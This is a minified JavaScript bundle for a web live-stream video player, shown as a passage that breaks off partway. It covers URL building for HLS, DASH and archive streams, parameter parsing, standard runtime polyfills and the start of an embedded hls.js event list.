var LivePlayer=function(l){function t(t){for(var e,r,n=t[0],i=t[1],a=t[2],s=0,o=[];s<n.length;s++)r=n[s],Object.prototype.hasOwnProperty.call(h,r)&&h[r]&&o.push(h[r][0]),h[r]=0;for(e in i)Object.prototype.hasOwnProperty.call(i,e)&&(l[e]=i[e]);for(d&&d(t);o.length;)o.shift()();return c.push.apply(c,a||[]),u()}function u(){for(var t,e=0;e<c.length;e++){for(var r=c[e],n=!0,i=1;i<r.length;i++){var a=r[i];0!==h[a]&&(n=!1)}n&&(c.splice(e--,1),t=s(s.s=r[0]))}return t}var r={},h={3:0},c=[];function s(t){var e;return(r[t]||(e=r[t]={i:t,l:!1,exports:{}},l[t].call(e.exports,e,e.exports,s),e.l=!0,e)).exports}s.m=l,s.c=r,s.d=function(t,e,r){s.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:r})},s.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},s.t=function(e,t){if(1&t&&(e=s(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(s.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)s.d(r,n,function(t){return e[t]}.bind(null,n));return r},s.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return s.d(e,"a",e),e},s.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},s.p="/flu/player/";var e=(n=this.webpackJsonpLivePlayer=this.webpackJsonpLivePlayer||[]).push.bind(n);n.push=t;for(var n=n.slice(),i=0;i<n.length;i++)t(n[i]);var d=e;return c.push([199,1,5,4,0,2,6]),u()}([function(t,e,r){"use strict";r.d(e,"b",(function(){return i})),r.d(e,"a",(function(){return a})),r.d(e,"e",(function(){return s})),r.d(e,"c",(function(){return o})),r.d(e,"d",(function(){return l}));var n=function(t,e){return(n=Object.setPrototypeOf||({__proto__:[]}instanceof Array?function(t,e){t.__proto__=e}:function(t,e){for(var r in e)e.hasOwnProperty(r)&&(t[r]=e[r])}))(t,e)};function i(t,e){function r(){this.constructor=t}n(t,e),t.prototype=null===e?Object.create(e):(r.prototype=e.prototype,new r)}var a=function(){return(a=Object.assign||function(t){for(var e,r=1,n=arguments.length;r<n;r++)for(var i in e=arguments[r])Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t}).apply(this,arguments)};function s(t){var e="function"==typeof Symbol&&Symbol.iterator,r=e&&t[e],n=0;if(r)return r.call(t);if(t&&"number"==typeof t.length)return{next:function(){return{value:(t=t&&n>=t.length?void 0:t)&&t[n++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function o(t,e){var r="function"==typeof Symbol&&t[Symbol.iterator];if(!r)return t;var n,i,a=r.call(t),s=[];try{for(;(void 0===e||0<e--)&&!(n=a.next()).done;)s.push(n.value)}catch(t){i={error:t}}finally{try{n&&!n.done&&(r=a.return)&&r.call(a)}finally{if(i)throw i.error}}return s}function l(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(o(arguments[e]));return t}},,,function(e,t){function r(t){return e.exports=r=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(t){return t.__proto__||Object.getPrototypeOf(t)},e.exports.__esModule=!0,e.exports.default=e.exports,r(t)}e.exports=r,e.exports.__esModule=!0,e.exports.default=e.exports},,function(t,e){t.exports=function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){var i=r(123);function n(t,e){for(var r=0;r<e.length;r++){var n=e[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(t,i(n.key),n)}}t.exports=function(t,e,r){return e&&n(t.prototype,e),r&&n(t,r),Object.defineProperty(t,"prototype",{writable:!1}),t},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){var i=r(357);function n(){return"undefined"!=typeof Reflect&&Reflect.get?t.exports=n=Reflect.get.bind():t.exports=n=function(t,e,r){var n=i(t,e);if(n)return(n=Object.getOwnPropertyDescriptor(n,e)).get?n.get.call(arguments.length<3?t:r):n.value},t.exports.__esModule=!0,t.exports.default=t.exports,n.apply(this,arguments)}t.exports=n,t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){var n=r(201);t.exports=function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,writable:!0,configurable:!0}}),Object.defineProperty(t,"prototype",{writable:!1}),e&&n(t,e)},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){var n=r(62).default,i=r(46);t.exports=function(t,e){if(e&&("object"===n(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return i(t)},t.exports.__esModule=!0,t.exports.default=t.exports},,,,,,,,function(t,e,r){var n=r(123);t.exports=function(t,e,r){return(e=n(e))in t?Object.defineProperty(t,e,{value:r,enumerable:!0,configurable:!0,writable:!0}):t[e]=r,t},t.exports.__esModule=!0,t.exports.default=t.exports},,,,,,,,,function(t,e,r){"use strict";r.d(e,"i",(function(){return A})),r.d(e,"j",(function(){return o})),r.d(e,"h",(function(){return l})),r.d(e,"g",(function(){return u})),r.d(e,"c",(function(){return v})),r.d(e,"e",(function(){return y})),r.d(e,"b",(function(){return S})),r.d(e,"f",(function(){return T})),r.d(e,"a",(function(){return E})),r.d(e,"d",(function(){return b}));e=r(17);var n=r.n(e),h=(e=r(162),r.n(e)),c=(e=r(62),r.n(e)),d=(e=r(120),r.n(e));function i(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function f(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach((function(t){n()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}var a="authTokenName",s=["streamName",a,"authToken","autoplay","ago","debug","duration","from","timeshift","logo","poster","hasPreview","isVideoPoster","proto","play_duration","realtime","to","tracks","liveSyncDurationCount","url","source","sentryConfig","chromeless","filter.tracks"],p=function(t){return t[a]||"token"};function g(t){if("string"==typeof t){if("false"===t.toLowerCase()||"0"===t)return!1;if("true"===t.toLowerCase()||"1"===t)return!0}return null}var o=function(t,e){var r,n=(t=d()({url:t})).pathname.split("/").filter((function(t){return""!==t&&-1===t.indexOf(".html")})).join("/"),a={},i=((i=t.query)&&(a=i.split("&").filter((function(t){return""!==t})).reduce((function(t,e){function r(t){return decodeURIComponent(t)}e=e.split("=");var n=(e=h()(e,2))[0];e=e[1];return t[r(n)]=r(e),t}),{})),e.reduce((function(t,e){return f(f({},t),e)}),{})),s=(e=f(f({},a),i),null!=(t=f(f(f({},{host:(i=(i=e.baseUrl)&&d()({url:i})||t).host,hostname:i.hostname,protocol:i.protocol,port:i.port,streamName:n}),a),e)).volume&&(t.volume=(i=t.volume,0<=(i=parseInt(i,10))&&i<=100?i:void 0)),1===t.mute?t.mute=!0:0===t.mute&&(t.mute=!1),t),o=[p(t),"volume"],l={};for(r in s){var u=s[r];"streamName"===r||o&&-1<o.indexOf(r)||null!==u&&"object"===c()(u)?l[r]=u:l[r]=null!=g(u)?g(u):u}return l};function l(t){return t=p(t),[].concat(s,t?[t]:[])}function u(t){var e=p(t);return(t=t[e])?"".concat(e,"=").concat(t):void 0}var v=function(t){var e=t.from;t=t.to;return e&&t&&0<t-e?t-e:void 0},m=function(t,e){return e?"".concat(t).concat(t.includes("?")?"&":"?").concat(e):t};function y(t){var e,r,n,i,a;return!1===t.poster?{isVideoPoster:!1,poster:!1}:(e=!t.hasPreview,r=u(t),n=t.host,i=t.protocol,a=t.streamName,t=t.hasPreview?"jpg":"mp4",i="".concat(i,"//").concat(n,"/").concat(a,"/preview.").concat(t),{isVideoPoster:e,poster:m(i,r)})}var E=function(t,e){var r=t.authToken,n=t.protocol,i=t.host;t=t.streamName;return m("".concat(n,"//").concat(i,"/").concat(t,"/").concat(e),r)},T=function(t,r){var n=t.proto,i=t.streamName,a=t.ago,s=t.from,o=t.duration,l=t.realtime,u=t.protocol,h=t.host,c=t.debug,d=t.authToken,f=t.url,p=t.source,g=t.timeshift,v=t.filterTracks;return function(){var t=f||p,e=".fmp4.m3u8";switch(n){case"dash":e=".mpd";break;case"ll-hls":e=l?".ll.m3u8":".fmp4.m3u8";break;default:e=".fmp4.m3u8"}return window.navigator.userAgent.includes("(Web0S; Linux/SmartTV)")&&(e="dash"),t||(t="//".concat(h,"/").concat(i,"/"),l&&r&&!a?"ll-hls"!==n&&r?t+="mse_ld".concat(s?"?from=".concat(s):""):t="".concat(u).concat(t,"index").concat(e):(t=(t="".concat(u).concat(t))+(a?"rewind-".concat(a).concat("dash"===n?"?thumbnails=100":""):s?"archive-".concat(s,"-").concat(o||"7200"):!g||"hls"!==n&&n?"index":"timeshift_".concat(10<=g.length?"abs":"rel","-").concat(g))+e,(a||s||g&&("hls"===n||!n))&&(t=t.replace(".fmp4","")))),t=m(t,d),v&&(t="".concat(t).concat(t.includes("?")?"&":"?","filter.tracks=").concat(v)),c&&console.info("set source",t),t}},b=function(t){var e=t.streamName,r=t.host;t=t.authToken,r="//".concat(r,"/").concat(e,"/media_info.json");return m(r,t)},A=function(){var t=window.navigator.userAgent;return!!(t.includes("Chrome")&&(t=t.split("Chrome/")[1],107<=Number(t.split(".")[0])))},_=function(t,e){return-1<e.indexOf(t)};function S(e,r){return function(t){return"true"===(t=_(t,r)?e[t]:void 0)||"on"===t||"false"!==t&&"off"!==t&&t}}},,,,,function(t,e){var r=function(){return this}();try{r=r||new Function("return this")()}catch(t){"object"==typeof window&&(r=window)}t.exports=r},,,,,,,,,,,,,,,function(t,e){t.exports=function(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t},t.exports.__esModule=!0,t.exports.default=t.exports},,,,,,,,,function(t,e,r){"use strict";var n,d=SyntaxError,i=Function,f=TypeError,a=function(t){try{return i('"use strict"; return ('+t+").constructor;")()}catch(t){}},p=Object.getOwnPropertyDescriptor;if(p)try{p({},"")}catch(t){p=null}function s(){throw new f}var o=p?function(){try{return s}catch(t){try{return p(arguments,"callee").get}catch(t){return s}}}():s,l=r(367)(),u=r(369)(),h=Object.getPrototypeOf||(u?function(t){return t.__proto__}:null),g={},v=(u="undefined"!=typeof Uint8Array&&h?h(Uint8Array):n,{"%AggregateError%":"undefined"==typeof AggregateError?n:AggregateError,"%Array%":Array,"%ArrayBuffer%":"undefined"==typeof ArrayBuffer?n:ArrayBuffer,"%ArrayIteratorPrototype%":l&&h?h([][Symbol.iterator]()):n,"%AsyncFromSyncIteratorPrototype%":n,"%AsyncFunction%":g,"%AsyncGenerator%":g,"%AsyncGeneratorFunction%":g,"%AsyncIteratorPrototype%":g,"%Atomics%":"undefined"==typeof Atomics?n:Atomics,"%BigInt%":"undefined"==typeof BigInt?n:BigInt,"%BigInt64Array%":"undefined"==typeof BigInt64Array?n:BigInt64Array,"%BigUint64Array%":"undefined"==typeof BigUint64Array?n:BigUint64Array,"%Boolean%":Boolean,"%DataView%":"undefined"==typeof DataView?n:DataView,"%Date%":Date,"%decodeURI%":decodeURI,"%decodeURIComponent%":decodeURIComponent,"%encodeURI%":encodeURI,"%encodeURIComponent%":encodeURIComponent,"%Error%":Error,"%eval%":eval,"%EvalError%":EvalError,"%Float32Array%":"undefined"==typeof Float32Array?n:Float32Array,"%Float64Array%":"undefined"==typeof Float64Array?n:Float64Array,"%FinalizationRegistry%":"undefined"==typeof FinalizationRegistry?n:FinalizationRegistry,"%Function%":i,"%GeneratorFunction%":g,"%Int8Array%":"undefined"==typeof Int8Array?n:Int8Array,"%Int16Array%":"undefined"==typeof Int16Array?n:Int16Array,"%Int32Array%":"undefined"==typeof Int32Array?n:Int32Array,"%isFinite%":isFinite,"%isNaN%":isNaN,"%IteratorPrototype%":l&&h?h(h([][Symbol.iterator]())):n,"%JSON%":"object"==typeof JSON?JSON:n,"%Map%":"undefined"==typeof Map?n:Map,"%MapIteratorPrototype%":"undefined"!=typeof Map&&l&&h?h((new Map)[Symbol.iterator]()):n,"%Math%":Math,"%Number%":Number,"%Object%":Object,"%parseFloat%":parseFloat,"%parseInt%":parseInt,"%Promise%":"undefined"==typeof Promise?n:Promise,"%Proxy%":"undefined"==typeof Proxy?n:Proxy,"%RangeError%":RangeError,"%ReferenceError%":ReferenceError,"%Reflect%":"undefined"==typeof Reflect?n:Reflect,"%RegExp%":RegExp,"%Set%":"undefined"==typeof Set?n:Set,"%SetIteratorPrototype%":"undefined"!=typeof Set&&l&&h?h((new Set)[Symbol.iterator]()):n,"%SharedArrayBuffer%":"undefined"==typeof SharedArrayBuffer?n:SharedArrayBuffer,"%String%":String,"%StringIteratorPrototype%":l&&h?h(""[Symbol.iterator]()):n,"%Symbol%":l?Symbol:n,"%SyntaxError%":d,"%ThrowTypeError%":o,"%TypedArray%":u,"%TypeError%":f,"%Uint8Array%":"undefined"==typeof Uint8Array?n:Uint8Array,"%Uint8ClampedArray%":"undefined"==typeof Uint8ClampedArray?n:Uint8ClampedArray,"%Uint16Array%":"undefined"==typeof Uint16Array?n:Uint16Array,"%Uint32Array%":"undefined"==typeof Uint32Array?n:Uint32Array,"%URIError%":URIError,"%WeakMap%":"undefined"==typeof WeakMap?n:WeakMap,"%WeakRef%":"undefined"==typeof WeakRef?n:WeakRef,"%WeakSet%":"undefined"==typeof WeakSet?n:WeakSet});if(h)try{null.error}catch(t){l=h(h(t)),v["%Error.prototype%"]=l}function m(t){var e,r;return"%AsyncFunction%"===t?e=a("async function () {}"):"%GeneratorFunction%"===t?e=a("function* () {}"):"%AsyncGeneratorFunction%"===t?e=a("async function* () {}"):"%AsyncGenerator%"===t?(r=m("%AsyncGeneratorFunction%"))&&(e=r.prototype):"%AsyncIteratorPrototype%"===t&&(r=m("%AsyncGenerator%"))&&h&&(e=h(r.prototype)),v[t]=e}var y={"%ArrayBufferPrototype%":["ArrayBuffer","prototype"],"%ArrayPrototype%":["Array","prototype"],"%ArrayProto_entries%":["Array","prototype","entries"],"%ArrayProto_forEach%":["Array","prototype","forEach"],"%ArrayProto_keys%":["Array","prototype","keys"],"%ArrayProto_values%":["Array","prototype","values"],"%AsyncFunctionPrototype%":["AsyncFunction","prototype"],"%AsyncGenerator%":["AsyncGeneratorFunction","prototype"],"%AsyncGeneratorPrototype%":["AsyncGeneratorFunction","prototype","prototype"],"%BooleanPrototype%":["Boolean","prototype"],"%DataViewPrototype%":["DataView","prototype"],"%DatePrototype%":["Date","prototype"],"%ErrorPrototype%":["Error","prototype"],"%EvalErrorPrototype%":["EvalError","prototype"],"%Float32ArrayPrototype%":["Float32Array","prototype"],"%Float64ArrayPrototype%":["Float64Array","prototype"],"%FunctionPrototype%":["Function","prototype"],"%Generator%":["GeneratorFunction","prototype"],"%GeneratorPrototype%":["GeneratorFunction","prototype","prototype"],"%Int8ArrayPrototype%":["Int8Array","prototype"],"%Int16ArrayPrototype%":["Int16Array","prototype"],"%Int32ArrayPrototype%":["Int32Array","prototype"],"%JSONParse%":["JSON","parse"],"%JSONStringify%":["JSON","stringify"],"%MapPrototype%":["Map","prototype"],"%NumberPrototype%":["Number","prototype"],"%ObjectPrototype%":["Object","prototype"],"%ObjProto_toString%":["Object","prototype","toString"],"%ObjProto_valueOf%":["Object","prototype","valueOf"],"%PromisePrototype%":["Promise","prototype"],"%PromiseProto_then%":["Promise","prototype","then"],"%Promise_all%":["Promise","all"],"%Promise_reject%":["Promise","reject"],"%Promise_resolve%":["Promise","resolve"],"%RangeErrorPrototype%":["RangeError","prototype"],"%ReferenceErrorPrototype%":["ReferenceError","prototype"],"%RegExpPrototype%":["RegExp","prototype"],"%SetPrototype%":["Set","prototype"],"%SharedArrayBufferPrototype%":["SharedArrayBuffer","prototype"],"%StringPrototype%":["String","prototype"],"%SymbolPrototype%":["Symbol","prototype"],"%SyntaxErrorPrototype%":["SyntaxError","prototype"],"%TypedArrayPrototype%":["TypedArray","prototype"],"%TypeErrorPrototype%":["TypeError","prototype"],"%Uint8ArrayPrototype%":["Uint8Array","prototype"],"%Uint8ClampedArrayPrototype%":["Uint8ClampedArray","prototype"],"%Uint16ArrayPrototype%":["Uint16Array","prototype"],"%Uint32ArrayPrototype%":["Uint32Array","prototype"],"%URIErrorPrototype%":["URIError","prototype"],"%WeakMapPrototype%":["WeakMap","prototype"],"%WeakSetPrototype%":["WeakSet","prototype"]},E=(o=r(118),r(371)),T=o.call(Function.call,Array.prototype.concat),b=o.call(Function.apply,Array.prototype.splice),A=o.call(Function.call,String.prototype.replace),_=o.call(Function.call,String.prototype.slice),S=o.call(Function.call,RegExp.prototype.exec),L=/[^%.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|%$))/g,k=/\\(\\)?/g;t.exports=function(t,e){if("string"!=typeof t||0===t.length)throw new f("intrinsic name must be a non-empty string");if(1<arguments.length&&"boolean"!=typeof e)throw new f('"allowMissing" argument must be a boolean');if(null===S(/^%?[^%]*%?$/,t))throw new d("`%` may not be present anywhere but at the beginning and end of the intrinsic name");var r=function(t){var e=_(t,0,1),r=_(t,-1);if("%"===e&&"%"!==r)throw new d("invalid intrinsic syntax, expected closing `%`");if("%"===r&&"%"!==e)throw new d("invalid intrinsic syntax, expected opening `%`");var i=[];return A(t,L,(function(t,e,r,n){i[i.length]=r?A(n,k,"$1"):e||t})),i}(t),n=0<r.length?r[0]:"",i=function(t,e){var r,n=t;if(E(y,n)&&(n="%"+(r=y[n])[0]+"%"),E(v,n)){var i=v[n];if(void 0!==(i=i===g?m(n):i)||e)return{alias:r,name:n,value:i};throw new f("intrinsic "+t+" exists, but is not available. Please file an issue!")}throw new d("intrinsic "+t+" does not exist!")}("%"+n+"%",e),a=(i.name,i.value),s=!1;(i=i.alias)&&(n=i[0],b(r,T([0,1],i)));for(var o=1,l=!0;o<r.length;o+=1){var u=r[o],h=_(u,0,1),c=_(u,-1);if(('"'===h||"'"===h||"`"===h||'"'===c||"'"===c||"`"===c)&&h!==c)throw new d("property names with quotes must have matching quotes");if("constructor"!==u&&l||(s=!0),E(v,h="%"+(n+="."+u)+"%"))a=v[h];else if(null!=a){if(!(u in a)){if(e)return;throw new f("base intrinsic for "+t+" exists, but the property is not available.")}a=p&&o+1>=r.length?(l=!!(c=p(a,u)))&&"get"in c&&!("originalValue"in c.get)?c.get:a[u]:(l=E(a,u),a[u]),l&&!s&&(v[h]=a)}}return a}},,,,,,,function(e,t){function r(t){return e.exports=r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},e.exports.__esModule=!0,e.exports.default=e.exports,r(t)}e.exports=r,e.exports.__esModule=!0,e.exports.default=e.exports},function(t,e,r){var n=r(354),i=r(355),a=r(154),s=r(356);t.exports=function(t){return n(t)||i(t)||a(t)||s()},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){r=r(358)(),t.exports=r;try{regeneratorRuntime=r}catch(t){"object"==typeof globalThis?globalThis.regeneratorRuntime=r:Function("r","regeneratorRuntime = r")(r)}},,,,,,,,,,,,,,,,,,,,,,,,function(t,e){function l(t,e,r,n,i,a,s){try{var o=t[a](s),l=o.value}catch(t){return void r(t)}o.done?e(l):Promise.resolve(l).then(n,i)}t.exports=function(o){return function(){var t=this,s=arguments;return new Promise((function(e,r){var n=o.apply(t,s);function i(t){l(n,e,r,i,a,"next",t)}function a(t){l(n,e,r,i,a,"throw",t)}i(void 0)}))}},t.exports.__esModule=!0,t.exports.default=t.exports},,function(t,e,r){"use strict";r.d(e,"a",(function(){return a})),r.d(e,"b",(function(){return s}));e=r(17);var n=r.n(e);function i(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function a(t){var e=function(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach((function(t){n()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}({},{media:{width:0,height:0},letterboxing:{horizontal:0,vertical:0}});return e.media.width=t.media.width*t.dom.height/t.media.height,e.media.height=t.media.height*e.media.width/t.media.width,e.media.width>t.dom.width&&(e.media.height=t.media.height*t.dom.width/t.media.width,e.media.width=t.media.width*e.media.height/t.media.height),e.media.width<t.dom.width?e.letterboxing.horizontal=Math.floor((t.dom.width-e.media.width)/2):e.media.height<t.dom.height&&(e.letterboxing.vertical=Math.floor((t.dom.height-e.media.height)/2)),e.media.width=Math.floor(e.media.width),e.media.height=Math.floor(e.media.height),e}function s(t){var r=(e=window).innerWidth,e=e.innerHeight,i=(n=document.documentElement).clientHeight,n=n.clientWidth,a=(t=t.getBoundingClientRect()).bottom,s=t.right,o=t.left;t=t.top;return 0<=a&&0<=s&&t<=(e||i)&&o<=(r||n)}r(121),Date.now(),window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame},,,,function(n,t,e){"use strict";e.d(t,"a",(function(){return _a}));t=e(63);var s=e.n(t),i=(t=e(17),e.n(t)),o=(t=e(5),e.n(t)),l=(t=e(6),e.n(t)),d=(t=e(7),e.n(t)),P=(t=e(8),e.n(t)),x=(t=e(9),e.n(t)),O=(t=e(3),e.n(t)),u=e(4);F=/^(?=((?:[a-zA-Z0-9+\-.]+:)?))\1(?=((?:\/\/[^\/?#]*)?))\2(?=((?:(?:[^?#\/]*\/)*[^;?#\/]*)?))\3((?:;[^?#]*)?)(\?[^#]*)?(#[^]*)?$/,j=/^(?=([^\/?#]*))\1([^]*)$/,q=/(?:\/|^)\.(?=\/)/g,z=/(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,a={buildAbsoluteURL:function(t,e,r){if(r=r||{},t=t.trim(),!(e=e.trim())){if(!r.alwaysNormalize)return t;var n=a.parseURL(t);if(n)return n.path=a.normalizePath(n.path),a.buildURLFromParts(n);throw new Error("Error trying to parse base URL.")}if(!(n=a.parseURL(e)))throw new Error("Error trying to parse relative URL.");if(n.scheme)return r.alwaysNormalize?(n.path=a.normalizePath(n.path),a.buildURLFromParts(n)):e;if(!(e=a.parseURL(t)))throw new Error("Error trying to parse base URL.");!e.netLoc&&e.path&&"/"!==e.path[0]&&(t=j.exec(e.path),e.netLoc=t[1],e.path=t[2]),e.netLoc&&!e.path&&(e.path="/");var i;t={scheme:e.scheme,netLoc:n.netLoc,path:null,params:n.params,query:n.query,fragment:n.fragment};return n.netLoc||(t.netLoc=e.netLoc,"/"!==n.path[0]&&(n.path?(i=(i=e.path).substring(0,i.lastIndexOf("/")+1)+n.path,t.path=a.normalizePath(i)):(t.path=e.path,n.params||(t.params=e.params,n.query)||(t.query=e.query)))),null===t.path&&(t.path=r.alwaysNormalize?a.normalizePath(n.path):n.path),a.buildURLFromParts(t)},parseURL:function(t){return(t=F.exec(t))?{scheme:t[1]||"",netLoc:t[2]||"",path:t[3]||"",params:t[4]||"",query:t[5]||"",fragment:t[6]||""}:null},normalizePath:function(t){for(t=t.split("").reverse().join("").replace(q,"");t.length!==(t=t.replace(z,"")).length;);return t.split("").reverse().join("")},buildURLFromParts:function(t){return t.scheme+t.netLoc+t.path+t.params+t.query+t.fragment}};var F,j,q,z,a,Q=a;function X(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function f(n){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?X(Object(i),!0).forEach((function(t){var e,r;e=n,r=i[t],(t=function(t){return t=function(t,e){if("object"!=typeof t||null===t)return t;var r=t[Symbol.toPrimitive];if(void 0===r)return String(t);if("object"!=typeof(r=r.call(t,"string")))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}(t),"symbol"==typeof t?t:String(t)}(t))in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(i)):X(Object(i)).forEach((function(t){Object.defineProperty(n,t,Object.getOwnPropertyDescriptor(i,t))}))}return n}function G(){return(G=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var r,n=arguments[e];for(r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t}).apply(this,arguments)}const N=Number.isFinite||function(t){return"number"==typeof t&&isFinite(t)},J=Number.isSafeInteger||function(t){return"number"==typeof t&&Math.abs(t)<=Z},Z=Number.MAX_SAFE_INTEGER||9007199254740991;let $=function(t){return t.MEDIA_ATTACHING="hlsMediaAttaching",t.MEDIA_ATTACHED="hlsMediaAttached",t.MEDIA_DETACHING="hlsMediaDetaching",t.MEDIA_DETACHED="hlsMediaDetached",t.BUFFER_RESET="hlsBufferReset",t.BUFFER_CODECS="hlsBufferCodecs",t.BUFFER_CREATED="hlsBufferCreated",t.BUFFER_APPENDING="hlsBufferAppending",t.BUFFER_APPENDED="hlsBufferAppended",t.BUFFER_EOS="hlsBufferEos",t.BUFFER_FLUSHING="hlsBufferFlushing",t.BUFFER_FLUSHED="hlsBufferFlushed",t.MANIFEST_LOADING="hlsManifestLoading",t.MANIFEST_LOADED="hlsManifestLoaded",t.MANIFEST_PARSED="hlsManifestParsed",t.LEVEL_SWITCHING="hlsLevelSwitching",t.LEVEL_SWITCHED="hlsLevelSwitched",t.LEVEL_LOADING="hlsLevelLoading",t.LEVEL_LOADED="hlsLevelLoaded",t.LEVEL_UPDATED="hlsLevelUpdated",t.LEVEL_PTS_UPDATED="hlsLevelPtsUpdated",t.LEVELS_UPDATED="hlsLevelsUpdated",t.AUDIO_TRACKS_UPDATED="hlsAudioTracksUpdated",t.AUDIO_TRACK_SWITCHING="hlsAudioTrackSwitching",t.AUDIO_TRACK_SWITCHED="hlsAudioTrackSwitched",t.AUDIO_TRACK_LOADING="hlsAudioTrackLoading",t.AUDIO_TRACK_LOADED="hlsAudioTrackLoaded",t.SUBTITLE_TRACKS_UPDATED="hlsSubtitleTracksUpdated",t.SUBTITLE_TRACKS_CLEARED="hlsSubtitleTracksCleared",t.SUBTITLE_TRACK_SWITCH="hlsSubtitleTrackSwitch",t.SUBTITLE_TRACK_LOADING="hlsSubtitleTrackLoading",t.SUBTITLE_TRACK_LOADED="hlsSubtitleTrackLoaded",t.SUBTITLE_FRAG_PROCESSED="hlsSubtitleFragProcessed",t.CUES_PARSED="hlsCuesParsed",t.NON_NATIVE_TEXT_TRACKS_FOUND="hlsNonNativeTextTracksFound",t.INIT_PTS_FOUND="hlsInitPtsFound",t.FRAG_LOADING="hlsFragLoading",t.FRAG_LOAD_EMERGENCY_ABORTED="hlsFragLoadEmergencyAborted",t.FRAG_LOADED="hlsFragLoaded",t.FRAG_DECRYPTED="hlsFragDecrypted",t.FRAG_PARSING_INIT_SEGMENT="hlsFragParsingInitSegment",t.FRAG_PARSING_USERDATA="hlsFragParsingUserdata",t.FRAG_PARSING_METADATA="hlsFragParsingMetadata",t.FRAG_PARSED="hlsFragParsed",t.FRAG_BUFFERED="hlsFragBuffered",t.FRAG_CHANGED="hlsFragChanged",t.FPS_DROP="hlsFpsDrop",t.FPS_DROP_LEVEL_CAPPING="hlsFpsDropLevelCapping",t.ERROR="hlsError",t.DESTROYING="hlsDestroying",t.KEY_LOADING="hlsKeyLoading",t.KEY_LOADED="hlsKeyLoaded",t.LIVE_BACK_BUFFER_REACHED="hlsLiveBackBufferReached",t.BACK_BUFFER_REACHED="hlsBackBufferReached",t}({}),K=function(t){return t.NETWORK_ERROR="networkError",t.MEDIA_ERROR="mediaError",t.KEY_SYSTEM_ERROR="keySystemError",t.MUX_ERROR="muxError",t.OTHER_ERROR="otherError",t}({}),H=function(t){return 